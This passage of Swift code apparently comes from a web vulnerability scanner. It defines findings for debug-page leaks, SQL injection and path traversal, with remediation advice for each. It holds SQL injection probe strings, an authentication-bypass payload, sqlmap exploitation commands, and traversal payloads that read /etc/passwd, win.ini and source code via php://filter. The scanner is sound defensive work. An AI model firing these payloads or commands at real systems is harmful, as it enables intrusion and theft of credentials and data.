            category: "Information Disclosure",
            location: url.absoluteString,
            detail: "The server returned a detailed stack trace or debug page instead of a generic error. These pages leak framework versions, absolute file paths, SQL, and sometimes environment variables or source code.",
            evidence: "URL: \(url.absoluteString)\nSignature: \(label)\nExcerpt: \(snippet(sample, max: 200))",
            exploit: "Stack traces map your internal structure (paths, components, versions) for an attacker and occasionally leak secrets directly. A left-on debug mode (e.g. Django DEBUG, Flask/Werkzeug console, Rails) can even permit remote code execution.",
            remediation: "Disable debug mode in production and return generic error pages. Log full details server-side only. Ensure DEBUG/development flags are off in the deployed configuration.",
            reference: "CWE-209: Generation of Error Message Containing Sensitive Information")
    }

    static let sqliPayloads = ["'", "\"", "')", "';", "\"'", "`", "\\", "'))", "\")", "')--", "';--"]

    private static let sqlErrorSignatures: [ErrorSig] = [
        sig("MySQL", "SQL syntax.*MySQL|Warning.*\\bmysqli?_|MySqlException|valid MySQL result|com\\.mysql\\.jdbc"),
        sig("PostgreSQL", "PostgreSQL.*ERROR|Warning.*\\bpg_|valid PostgreSQL result|Npgsql\\.|PG::[a-zA-Z]*Error|quoted string not properly terminated"),
        sig("Microsoft SQL Server", "Microsoft (?:OLE DB|SQL Server|JET Database)|ODBC SQL Server Driver|Unclosed quotation mark after the character string|System\\.Data\\.SqlClient\\.SqlException|Incorrect syntax near"),
        sig("Oracle", "\\bORA-[0-9]{4,5}\\b|Oracle error|quoted string not properly terminated|SQL command not properly ended"),
        sig("SQLite", "SQLite/JDBCDriver|SQLite\\.Exception|System\\.Data\\.SQLite\\.SQLiteException|Warning.*\\bsqlite_|\\[SQLITE_ERROR\\]|unrecognized token:"),
        sig("Generic SQL", "SQLSTATE\\[|Syntax error or access violation|You have an error in your SQL syntax|Unclosed quotation mark|unterminated quoted string"),
        sig("IBM Db2", "CLI Driver.*DB2|DB2 SQL error|\\bdb2_\\w+\\(|DB2Exception|SQLCODE[=:0-9, -]+SQLSTATE|com\\.ibm\\.db2\\.jcc"),
        sig("Sybase", "Warning.*\\bsybase_|Sybase message|Sybase.*Server message|SybSQLException|Sybase\\.Data\\.AseClient|com\\.sybase\\.jdbc"),
        sig("Informix", "Warning.*\\bifx_|Exception.*Informix|Informix ODBC Driver|ODBC Informix driver|com\\.informix\\.jdbc|weblogic\\.jdbc\\.informix"),
        sig("Firebird/InterBase", "Dynamic SQL Error|Warning.*\\bibase_|org\\.firebirdsql\\.jdbc|firebirdsql"),
        sig("Snowflake", "net\\.snowflake\\.client|SnowflakeSQLException|SQL compilation error"),
        sig("CockroachDB", "CockroachDB|cockroachlabs\\.com"),
    ]

    static func sqlErrorSignature(in text: String) -> String? {
        let ns = text as NSString
        let range = NSRange(location: 0, length: min(ns.length, 200_000))
        for s in sqlErrorSignatures where s.regex.firstMatch(in: text, range: range) != nil {
            return s.label
        }
        return nil
    }

    static func sqlErrorDetail(in text: String) -> (dbms: String, sample: String)? {
        let ns = text as NSString
        let range = NSRange(location: 0, length: min(ns.length, 200_000))
        for s in sqlErrorSignatures {
            if let m = s.regex.firstMatch(in: text, range: range) {
                let start = max(0, m.range.location - 20)
                let len = min(ns.length - start, m.range.length + 160)
                return (s.label, ns.substring(with: NSRange(location: start, length: len)))
            }
        }
        return nil
    }

    static func sqlInjectionFinding(pageURL: URL, param: String, dbms: String, poc: URL) -> Finding {
        Finding(
            title: "SQL injection (error-based) in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "Injecting a single quote into the '\(param)' parameter caused the backend to emit a \(dbms) database error that was absent from the normal response. That means user input reaches a SQL query unparameterized.",
            evidence: "Baseline request had no SQL error; the quote-injected request returned a \(dbms) error.\nInjected: \(poc.absoluteString)",
            exploit: "SQL injection lets an attacker read or modify the entire database - dumping user credentials, bypassing authentication (' OR '1'='1), and on many stacks escalating to file read/write or command execution. Confirm and exploit with sqlmap.",
            remediation: "Use parameterized queries / prepared statements (never string-concatenate input into SQL). Apply least-privilege DB accounts and an allow-list for any dynamic identifiers. An ORM with bound parameters closes this by default.",
            reference: "CWE-89: SQL Injection",
            reproduction: "sqlmap -u \"\(pageURL.absoluteString)\" -p \(param) --batch --risk 2 --level 3")
    }

    static let sqliHeaders = ["User-Agent", "Referer", "X-Forwarded-For",
                              "X-Forwarded-Host", "X-Real-IP", "True-Client-IP", "Client-IP"]

    static func sqlInjectionHeaderFinding(pageURL: URL, header: String, dbms: String) -> Finding {
        Finding(
            title: "SQL injection via '\(header)' header",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "Sending a single quote in the '\(header)' request header caused the backend to emit a \(dbms) database error that was absent from the normal response. The header value reaches a SQL query unparameterized (commonly an analytics, rate-limit, geo-IP or audit-log insert).",
            evidence: "Baseline request had no SQL error; setting \(header): ' returned a \(dbms) error.\nURL: \(pageURL.absoluteString)",
            exploit: "Header-based SQL injection is often missed because the value isn't a visible parameter, yet it lets an attacker read or modify the whole database - dumping credentials, bypassing auth, or escalating to file/command execution. Confirm and exploit with sqlmap's header targeting.",
            remediation: "Treat all request headers as untrusted input: use parameterized queries / prepared statements when storing User-Agent, Referer or client-IP values, and never string-concatenate them into SQL.",
            reference: "CWE-89: SQL Injection",
            reproduction: "sqlmap -u \"\(pageURL.absoluteString)\" --headers=\"\(header): *\" --batch --risk 2 --level 5")
    }

    static func sqlInjectionFormFinding(pageURL: URL, action: URL, field: String, method: String, dbms: String) -> Finding {
        Finding(
            title: "SQL injection (error-based) in form field '\(field)'",
            severity: .critical,
            category: "Injection",
            location: action.absoluteString,
            detail: "Submitting a single quote in the '\(field)' field of a form on \(pageURL.absoluteString) caused the backend to emit a \(dbms) database error absent from the normal submission. The field value reaches a SQL query unparameterized - on a login form this is the classic authentication-bypass vector.",
            evidence: "Form on: \(pageURL.absoluteString)\n\(method) to: \(action.absoluteString)\nField: \(field)\nA clean baseline submission produced no SQL error; the quote-injected submission returned a \(dbms) error.",
            exploit: "Form SQL injection lets an attacker dump the database (credentials, PII), and on a login form bypass authentication with payloads like ' OR '1'='1'-- . Frequently escalates to full data modification or RCE. Confirm with sqlmap --forms / --data.",
            remediation: "Use parameterized queries / prepared statements for every form field (never string-concatenate input into SQL). Validate and allow-list input, and apply least-privilege DB accounts.",
            reference: "CWE-89: SQL Injection",
            reproduction: "sqlmap -u \"\(action.absoluteString)\" --data=\"\(field)=x\" -p \(field) --batch --risk 2 --level 3")
    }

    static let traversalPayloads = [
        "../../../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "%2fetc%2fpasswd",
        "/etc/passwd%00",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=index",
    ]

    static func traversalLeak(in text: String) -> String? {
        if regexMatches("(?m)^root:.*:0:0:", in: text) { return "/etc/passwd (Unix)" }
        if regexMatches("(?i)\\[extensions\\]|for 16-bit app support|\\[fonts\\]", in: text) { return "win.ini (Windows)" }

        if text.contains("cm9vdDo") { return "/etc/passwd (base64 via php://filter)" }

        if regexMatches("PD9waHA|PD9QSFA", in: text) { return "PHP source (base64 via php://filter)" }
        return nil
    }

    static func pathTraversalFinding(pageURL: URL, param: String, file: String, poc: URL) -> Finding {
        Finding(
            title: "Path traversal / Local File Inclusion in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "The '\(param)' parameter accepts directory-traversal sequences (../) and returned the contents of \(file). The application uses request input to build a filesystem path without confining it.",
            evidence: "Injected: \(poc.absoluteString)\nThe response contained the contents of \(file).",
            exploit: "An attacker reads arbitrary server files: source code, configuration, credentials (/etc/passwd, .env, cloud keys, private keys). If the same sink includes files as code (PHP include, template), it can escalate to remote code execution.",
            remediation: "Do not build file paths from user input. Map inputs to an allow-list of known files/IDs, canonicalize the resolved path and verify it stays within an intended base directory, and strip '../', encoded traversal, and null bytes.",
            reference: "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)",
            reproduction: "curl -s \"\(poc.absoluteString)\"   # returns file contents if vulnerable")
    }
}
